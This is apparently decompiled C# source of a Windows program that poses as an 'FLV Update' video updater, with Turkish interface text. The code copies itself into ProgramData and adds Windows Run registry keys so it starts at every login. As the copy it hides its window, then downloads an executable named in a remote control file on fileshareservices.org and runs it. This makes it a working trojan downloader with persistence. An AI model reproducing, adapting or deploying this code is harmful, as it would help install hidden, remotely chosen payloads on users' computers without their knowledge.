using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WindowsFormsApplication5;

public sealed class Form1 : Form
{
	public static string programDirectory = string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));

	public static string extensionDirectory = programDirectory + "\\SExtension";

	public static string exeName = "YokExe.exe";

	public static string copyName = "FLVUpdate";

	public static string projectName = "FLVGuncelle";

	public static string fileVersion = FileVersionInfo.GetVersionInfo(Assembly.GetExecutingAssembly().Location).FileVersion;

	public static string checkUrl = "http://www.fileshareservices.org/extFiles/control" + fileVersion + ".txt";

	public static string targetPath = Path.Combine(programDirectory, copyName + ".exe");

	public static string sourcePath = Application.get_ExecutablePath();

	private bool waitingStatus = false;

	private IContainer components = null;

	private ProgressBar progressBar1;

	private Label label1;

	public Form1()
	{
		InitializeComponent();
	}

	public void SaveLibrary(string name)
	{
		using Stream stream = ((object)this).GetType().Assembly.GetManifestResourceStream("FLVGuncelle.Dependecies." + name);
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		using Stream stream2 = new FileStream(targetPath, FileMode.Create);
		stream2.Write(array, 0, array.Length);
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void ProgressChanged(object sender, DownloadProgressChangedEventArgs e)
	{
		progressBar1.set_Value(e.ProgressPercentage);
	}

	private void Completed(object sender, AsyncCompletedEventArgs e)
	{
		((Control)label1).set_Text("Güncelleme Tamamlandı...!");
		Process.Start(programDirectory + "\\" + exeName);
		((Control)label1).set_Text("Güncelleme Tamamlandı...!");
	}

	private void Form1_Load_1(object sender, EventArgs e)
	{
		//IL_021b: Unknown result type (might be due to invalid IL or missing references)
		if (Process.GetCurrentProcess().ProcessName != copyName && !File.Exists(targetPath))
		{
			SaveLibrary(projectName + ".exe");
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true)!.SetValue(projectName, "\"" + targetPath + "\"");
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(projectName, "\"" + targetPath + "\"");
		}
		if (Process.GetCurrentProcess().ProcessName == copyName)
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true)!.SetValue(projectName, "\"" + targetPath + "\"");
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(projectName, "\"" + targetPath + "\"");
			if (Directory.Exists(extensionDirectory))
			{
				Process.Start(programDirectory + "\\" + exeName);
				waitingStatus = true;
			}
			else
			{
				waitingStatus = false;
			}
			((Control)this).set_Visible(false);
			((Form)this).set_Opacity(0.0);
			((Form)this).set_ShowInTaskbar(false);
		}
		if (!waitingStatus)
		{
			((Control)label1).set_Text("Lütfen bekleyin, güncelleme yapılıyor!");
			WebClient webClient = new WebClient();
			webClient.Headers["User-Agent"] = "WebClient For Extensions";
			string text = webClient.DownloadString(new Uri(checkUrl));
			if (text.IndexOf(".exe") != -1)
			{
				webClient.DownloadFileCompleted += Completed;
				webClient.DownloadProgressChanged += ProgressChanged;
				webClient.Headers["User-Agent"] = "WebClient For Extensions";
				webClient.DownloadFileAsync(new Uri(text), programDirectory + "\\" + exeName);
			}
			else
			{
				MessageBox.Show("PROBLEM!");
			}
		}
	}

	private void progressBar1_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		//IL_018f: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		progressBar1 = new ProgressBar();
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)progressBar1).set_Location(new Point(15, 40));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(260, 40));
		((Control)progressBar1).set_TabIndex(0);
		((Control)progressBar1).add_Click((EventHandler)progressBar1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Verdana", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(52, 16));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("label1");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(287, 88));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("FLV Update");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load_1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
